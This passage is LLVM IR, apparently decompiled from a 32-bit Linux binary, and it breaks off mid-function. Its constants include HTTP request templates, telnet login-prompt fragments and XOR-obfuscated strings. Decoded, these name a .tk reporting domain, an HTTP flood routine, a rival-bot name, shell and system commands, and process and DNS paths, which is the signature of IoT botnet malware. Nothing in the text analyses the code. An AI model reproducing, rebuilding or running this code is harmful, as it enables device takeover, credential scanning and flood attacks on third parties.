source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80567d0.2 = global i32 0
@global_var_80567e8.3 = local_unnamed_addr global i32* @global_var_80567d0.2
@global_var_8054af4.5 = constant [4 x i8] c"GET\00"
@global_var_8054acd.6 = constant i32 1210056751
@global_var_8054aff.7 = constant i32 540737568
@global_var_8054acf.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8054ae7.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_8054b06.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8054af8.11 = constant [9 x i8] c"Cookie: \00"
@global_var_8054b01.12 = constant [3 x i8] c"; \00"
@global_var_8054b04.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8054b09.14 = constant i32 1952972859
@global_var_8054b0b.15 = constant [5 x i8] c"http\00"
@global_var_8054b1a.16 = constant i32 -1623588825
@global_var_8054b10.17 = constant [5 x i8] c"url=\00"
@global_var_8054b15.18 = constant [5 x i8] c"POST\00"
@global_var_8054b13.19 = constant i32 1330643005
@global_var_8054b30.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_8056944.21 = local_unnamed_addr global i32 0
@global_var_8056940.22 = local_unnamed_addr global i32 0
@global_var_80568c0.23 = local_unnamed_addr global i32 0
@global_var_80567f4.24 = local_unnamed_addr global i32 134553264
@global_var_80567ec.25 = local_unnamed_addr global i32 -1
@global_var_805693c.27 = local_unnamed_addr global i32 0
@global_var_805694c.28 = local_unnamed_addr global i32 0
@global_var_805694a.29 = local_unnamed_addr global i32 0
@global_var_80568c8.30 = local_unnamed_addr global i32 0
@global_var_80568d4.31 = local_unnamed_addr global i32 0
@global_var_80568cc.32 = local_unnamed_addr global i32 0
@global_var_80568d0.33 = local_unnamed_addr global i32 0
@global_var_8056910.34 = local_unnamed_addr global i32 0
@global_var_80568ea.35 = local_unnamed_addr global i32 0
@global_var_80568f0.36 = local_unnamed_addr global i32 0
@global_var_80568e0.37 = global i32 0
@global_var_80568f8.39 = local_unnamed_addr global i32 0
@global_var_8056904.40 = local_unnamed_addr global i32 0
@global_var_80568f4.41 = global i32 0
@global_var_805695c.42 = local_unnamed_addr global i32 0
@global_var_80568e4.43 = local_unnamed_addr global i32 0
@global_var_80568ec.44 = local_unnamed_addr global i32 0
@global_var_8056958.45 = local_unnamed_addr global i32 0
@global_var_8054d05.46 = constant [5 x i8] c"ogin\00"
@global_var_8054d0a.47 = constant [6 x i8] c"enter\00"
@global_var_8054d10.48 = constant [8 x i8] c"assword\00"
@global_var_80568d8.50 = local_unnamed_addr global i32 0
@global_var_8056908.51 = local_unnamed_addr global i32 0
@global_var_8056980.52 = global i32 0
@global_var_8054d4f.54 = constant [11 x i8] c"AMMNZP\0CVI\22\00"
@global_var_8056998.55 = local_unnamed_addr global i32 0
@global_var_805699c.56 = local_unnamed_addr global i32 0
@global_var_8054d44.57 = constant [3 x i8] c"\225\00"
@global_var_80569a0.58 = local_unnamed_addr global i32 0
@global_var_80569a4.59 = local_unnamed_addr global i32 0
@global_var_8054d47.60 = constant [19 x i8] c"PGQWNVQ\0CAMMNZP\0CVI\22\00"
@global_var_8056a10.61 = local_unnamed_addr global i32 0
@global_var_8056a14.62 = local_unnamed_addr global i32 0
@global_var_8054d5a.63 = constant i32 1308673945
@global_var_8056a18.64 = local_unnamed_addr global i32 0
@global_var_8056a1c.65 = local_unnamed_addr global i32 0
@global_var_8054d5d.66 = constant i32 1448168270
@global_var_8056990.67 = local_unnamed_addr global i32 0
@global_var_8056994.68 = local_unnamed_addr global i32 0
@global_var_8054d6d.69 = constant i32 1381389898
@global_var_80569a8.70 = local_unnamed_addr global i32 0
@global_var_80569ac.71 = local_unnamed_addr global i32 0
@global_var_8054d8b.72 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_80569b0.73 = local_unnamed_addr global i32 0
@global_var_80569b4.74 = local_unnamed_addr global i32 0
@global_var_8054d93.75 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_80569b8.76 = local_unnamed_addr global i32 0
@global_var_80569bc.77 = local_unnamed_addr global i32 0
@global_var_8054d99.78 = constant i32 1195772418
@global_var_80569c0.79 = local_unnamed_addr global i32 0
@global_var_80569c4.80 = local_unnamed_addr global i32 0
@global_var_8054da5.81 = constant [5 x i8] c"\0DDF\22\00"
@global_var_80569c8.82 = local_unnamed_addr global i32 0
@global_var_80569cc.83 = local_unnamed_addr global i32 0
@global_var_8054daa.84 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_80569d0.85 = local_unnamed_addr global i32 0
@global_var_80569d4.86 = local_unnamed_addr global i32 0
@global_var_8054db2.87 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_80569d8.88 = local_unnamed_addr global i32 0
@global_var_80569dc.89 = local_unnamed_addr global i32 0
@global_var_8054dbb.90 = constant i32 1836214128
@global_var_80569e0.91 = local_unnamed_addr global i32 0
@global_var_80569e4.92 = local_unnamed_addr global i32 0
@global_var_8054dc9.93 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_80569e8.94 = local_unnamed_addr global i32 0
@global_var_80569ec.95 = local_unnamed_addr global i32 0
@global_var_8054dd4.96 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_80569f0.97 = local_unnamed_addr global i32 0
@global_var_80569f4.98 = local_unnamed_addr global i32 0
@global_var_8054f54.99 = constant i32 437738110
@global_var_80569f8.100 = local_unnamed_addr global i32 0
@global_var_80569fc.101 = local_unnamed_addr global i32 0
@global_var_8054ddf.102 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_8056a00.103 = local_unnamed_addr global i32 0
@global_var_8056a04.104 = local_unnamed_addr global i32 0
@global_var_8054de8.105 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_8056a08.106 = local_unnamed_addr global i32 0
@global_var_8056a0c.107 = local_unnamed_addr global i32 0
@global_var_8054df4.108 = constant [7 x i8] c"QJGNN\22\00"
@global_var_8056a20.109 = local_unnamed_addr global i32 0
@global_var_8056a24.110 = local_unnamed_addr global i32 0
@global_var_8054dfb.111 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_8056a28.112 = local_unnamed_addr global i32 0
@global_var_8056a2c.113 = local_unnamed_addr global i32 0
@global_var_8054e03.114 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_8056a30.115 = local_unnamed_addr global i32 0
@global_var_8056a34.116 = local_unnamed_addr global i32 0
@global_var_8054e0b.117 = constant [4 x i8] c"QJ\22\00"
@global_var_8056a38.118 = local_unnamed_addr global i32 0
@global_var_8056a3c.119 = local_unnamed_addr global i32 0
@global_var_8054e0f.120 = constant i32 1280000013
@global_var_8056a40.121 = local_unnamed_addr global i32 0
@global_var_8056a44.122 = local_unnamed_addr global i32 0
@global_var_8054e23.123 = constant i32 1668311919
@global_var_8056a48.124 = local_unnamed_addr global i32 0
@global_var_8056a4c.125 = local_unnamed_addr global i32 0
@global_var_8054e3c.126 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_8056a50.127 = local_unnamed_addr global i32 0
@global_var_8056a54.128 = local_unnamed_addr global i32 0
@global_var_8054e46.129 = constant i32 1280000013
@global_var_8056a58.130 = local_unnamed_addr global i32 0
@global_var_8056a5c.131 = local_unnamed_addr global i32 0
@global_var_8054e57.132 = constant i32 1280000013
@global_var_8056a60.133 = local_unnamed_addr global i32 0
@global_var_8056a64.134 = local_unnamed_addr global i32 0
@global_var_8054e6e.135 = constant i32 1464693110
@global_var_8056a68.136 = local_unnamed_addr global i32 0
@global_var_8056a6c.137 = local_unnamed_addr global i32 0
@global_var_8054e84.138 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8056a70.139 = local_unnamed_addr global i32 0
@global_var_8056a74.140 = local_unnamed_addr global i32 0
@global_var_8054e96.141 = constant i32 1196376908
@global_var_8056a78.142 = local_unnamed_addr global i32 0
@global_var_8056a7c.143 = local_unnamed_addr global i32 0
@global_var_8054ea3.144 = constant i32 1280068961
@global_var_8056a80.145 = local_unnamed_addr global i32 0
@global_var_8056a84.146 = local_unnamed_addr global i32 0
@global_var_8054f78.147 = constant i32 1195458915
@global_var_8056a88.148 = local_unnamed_addr global i32 0
@global_var_8056a8c.149 = local_unnamed_addr global i32 0
@global_var_8054fcc.150 = constant i32 1195458915
@global_var_8056a90.151 = local_unnamed_addr global i32 0
@global_var_8056a94.152 = local_unnamed_addr global i32 0
@global_var_8054ff0.153 = constant i32 1447841121
@global_var_8056a98.154 = local_unnamed_addr global i32 0
@global_var_8056a9c.155 = local_unnamed_addr global i32 0
@global_var_8054ebb.156 = constant i32 1633044305
@global_var_8056aa0.157 = local_unnamed_addr global i32 0
@global_var_8056aa4.158 = local_unnamed_addr global i32 0
@global_var_8054ec8.159 = constant i32 1346651984
@global_var_8056aa8.160 = local_unnamed_addr global i32 0
@global_var_8056aac.161 = local_unnamed_addr global i32 0
@global_var_8054ed2.162 = constant i32 1128353102
@global_var_8056ab0.163 = local_unnamed_addr global i32 0
@global_var_8056ab4.164 = local_unnamed_addr global i32 0
@global_var_8054edd.165 = constant i32 257312593
@global_var_8056ab8.166 = local_unnamed_addr global i32 0
@global_var_8056abc.167 = local_unnamed_addr global i32 0
@global_var_8054eea.168 = constant i32 1447841089
@global_var_8056ac0.169 = local_unnamed_addr global i32 0
@global_var_8056ac4.170 = local_unnamed_addr global i32 0
@global_var_8054efb.171 = constant i32 1279479894
@global_var_8056ac8.172 = local_unnamed_addr global i32 0
@global_var_8056acc.173 = local_unnamed_addr global i32 0
@global_var_8054f0f.174 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_8056ad0.175 = local_unnamed_addr global i32 0
@global_var_8056ad4.176 = local_unnamed_addr global i32 0
@global_var_8054eaf.177 = constant i32 1380403017
@global_var_8056ad8.178 = local_unnamed_addr global i32 0
@global_var_8056adc.179 = local_unnamed_addr global i32 0
@global_var_8054f18.180 = constant i32 1280068929
@global_var_8056ae0.181 = local_unnamed_addr global i32 0
@global_var_8056ae4.182 = local_unnamed_addr global i32 0
@global_var_8054f25.183 = constant i32 1414547281
@global_var_8056ae8.184 = local_unnamed_addr global i32 0
@global_var_8056aec.185 = local_unnamed_addr global i32 0
@global_var_8054f38.186 = constant i32 1414547281
@global_var_8056af0.187 = local_unnamed_addr global i32 0
@global_var_8056af4.188 = local_unnamed_addr global i32 0
@global_var_8055024.189 = constant i32 1264078191
@global_var_8056af8.190 = local_unnamed_addr global i32 0
@global_var_8056afc.191 = local_unnamed_addr global i32 0
@global_var_8055094.192 = constant i32 1264078191
@global_var_8056b00.193 = local_unnamed_addr global i32 0
@global_var_8056b04.194 = local_unnamed_addr global i32 0
@global_var_8055104.195 = constant i32 1264078191
@global_var_8056b08.196 = local_unnamed_addr global i32 0
@global_var_8056b0c.197 = local_unnamed_addr global i32 0
@global_var_8055174.198 = constant i32 1264078191
@global_var_8056b10.199 = local_unnamed_addr global i32 0
@global_var_8056b14.200 = local_unnamed_addr global i32 0
@global_var_80551e4.201 = constant i32 1264078191
@global_var_8056b18.202 = local_unnamed_addr global i32 0
@global_var_8056b1c.203 = local_unnamed_addr global i32 0
@global_var_8056934.204 = global i32 0
@global_var_8056b20.205 = global i32 0
@global_var_8056800.206 = global i32 0
@global_var_8056bcc.208 = global i32 0
@global_var_8056bd0.209 = local_unnamed_addr global i32 0
@global_var_8056bd4.210 = global i32 0
@global_var_8056be0.211 = local_unnamed_addr global i32 0
@global_var_8056ed4.212 = global i32 0
@global_var_8056efc.213 = local_unnamed_addr global i32 0
@global_var_8056eec.214 = local_unnamed_addr global i32 0
@global_var_8056ef0.215 = local_unnamed_addr global i32 0
@global_var_8056ef4.216 = local_unnamed_addr global i32 0
@global_var_8056ef8.217 = local_unnamed_addr global i32 0
@global_var_8056f04.218 = local_unnamed_addr global i32 0
@global_var_8056f10.219 = local_unnamed_addr global i32 0
@global_var_8056f08.220 = local_unnamed_addr global i32 0
@global_var_8056f14.221 = local_unnamed_addr global i32 0
@global_var_8056ee8.222 = local_unnamed_addr global i32 0
@global_var_8056ee4.224 = local_unnamed_addr global i32 0
@global_var_8056f0c.225 = local_unnamed_addr global i32 0
@global_var_8056bdc.226 = local_unnamed_addr global i32 0
@global_var_8056818.227 = global i32 0
@global_var_80555c0.229 = constant i32 33554944
@global_var_805684c.230 = local_unnamed_addr global i32* @global_var_80555c0.229
@global_var_8056830.231 = global i32 0
@global_var_8056918.232 = local_unnamed_addr global i32 0
@global_var_80567c4.234 = global i32 -1
@global_var_8054079.235 = constant i32 -294069
@global_var_8056928.236 = local_unnamed_addr global i32 0
@global_var_805692c.237 = local_unnamed_addr global i32 0
@global_var_80554b4.238 = constant [10 x i8] c"/dev/null\00"
@global_var_8056924.240 = local_unnamed_addr global i32 0
@global_var_805691c.241 = local_unnamed_addr global i32 0
@global_var_8056920.242 = local_unnamed_addr global i32 0
@global_var_8054b08.243 = constant i32 1744845568
@global_var_8056848.244 = local_unnamed_addr global i32* @global_var_8054b08.243
@global_var_805425f.245 = constant i32 1928542531
@global_var_8054283.246 = constant i32 1928542531
@global_var_8056938.247 = local_unnamed_addr global i32 0
@global_var_8056f18.248 = local_unnamed_addr global i32 0
@global_var_8056f1c.249 = local_unnamed_addr global i32 0
@global_var_8056860.1 = local_unnamed_addr global i8 0
@global_var_80567f8.26 = local_unnamed_addr global i8 1
@global_var_80568f6.38 = local_unnamed_addr global i16 0
@global_var_805690c.49 = local_unnamed_addr global i16 0
@global_var_80567fc.53 = local_unnamed_addr global i16 -16657
@global_var_8056ba0.207 = global i8 0
@global_var_8056f00.223 = local_unnamed_addr global i8 0
@global_var_8056914.228 = local_unnamed_addr global i8 0
@global_var_8056930.239 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 59195
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8054a80()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8056860.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80567e8.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80567e8.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80567e8.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8056860.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80567e8.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8056860.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134567872)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134571988 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* %ecx.global-to-local, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8054115(i32 134538704, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134564518, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134564518, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134564518, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8054af4.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp135 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp135, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_8054acd.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_805276a(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp237 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_8051c40(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_8051c40(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_8051c40(i8* %tmp237)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5211 = call i32 @function_8051c40(i8* %tmp237)
  store i32 %v2_80482a5211, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4212 = icmp eq i32 %v2_80482a5211, 0
